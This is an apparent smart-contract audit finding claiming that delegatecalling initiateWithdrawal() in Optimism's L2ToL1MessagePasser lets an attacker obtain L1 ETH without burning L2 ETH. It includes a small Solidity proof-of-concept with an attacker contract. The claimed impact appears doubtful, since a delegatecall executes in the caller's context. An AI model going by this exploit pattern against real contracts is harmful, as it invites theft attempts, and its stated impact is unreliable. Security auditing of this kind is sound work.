# Delegate call to the initiateWithdrawal() function of the L2ToL1MessagePasser.sol would result in positive msg.value without sending any real value

## Summary

## Vulnerability Detail
An attacker can call a contract on L2, with positive msg.value (say 10 ETH) which in turn would delegate call the initiateWithdrawal() function of the L2ToL1MessagePasser.sol without any value. However, the initiateWithdrawal() function would read a positive msg.value while emitting MessagePassed event [in line 120](https://github.com/ethereum-optimism/optimism/blob/9b9f78c6613c6ee53b93ca43c71bb74479f4b975/packages/contracts-bedrock/contracts/L2/L2ToL1MessagePasser.sol#L120). This would let an attacker get ETH on L1 without burning ETH on L2.

## Impact
An attacker could get ETH on L1 without burning ETH on L2.

## Code Snippet
Below is a contract that is similar to the L2ToL1MessagePasser.sol contract. The emitter() function is equivalent to the initiateWithdrawal() function:
// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.15;

contract Test {

    event MessagePassed(uint256 value);

    function emitter() external payable {

        emit MessagePassed(msg.value);
    }
}

Below is a contract (deployed by an attacker) that would perform the delegate call:
// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.15;

contract Test_1 {

    function attack(address test) external payable {

        (bool success,) = test.delegatecall(abi.encodeWithSignature("emitter()"));
        require(success);
    }
}

The screenshot below shows that the call to Test_1.attack() is successful and the MessagePassed event is also emitted.

Manual Review

## Recommendation
Add a check for no delegate calls in the initiateWithdrawal() function of the L2ToL1MessagePasser.sol.
